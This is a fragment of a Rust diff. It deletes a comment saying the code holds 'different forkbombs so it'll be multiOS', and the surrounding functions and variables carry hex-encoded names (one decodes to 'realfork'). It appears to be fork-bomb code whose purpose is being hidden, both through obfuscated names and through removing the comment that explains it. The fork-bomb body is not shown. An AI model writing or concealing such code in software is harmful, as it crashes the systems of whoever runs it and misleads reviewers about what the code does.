@@ -5,7 +5,6 @@ pub fn main() {
     _0x7265616c666f726b();
 }
 
-// different forkbombs so it'll be multiOS
 fn _0x7265616c666f726b() {
     if cfg!(unix) {
         let mut _0x66696c65 =
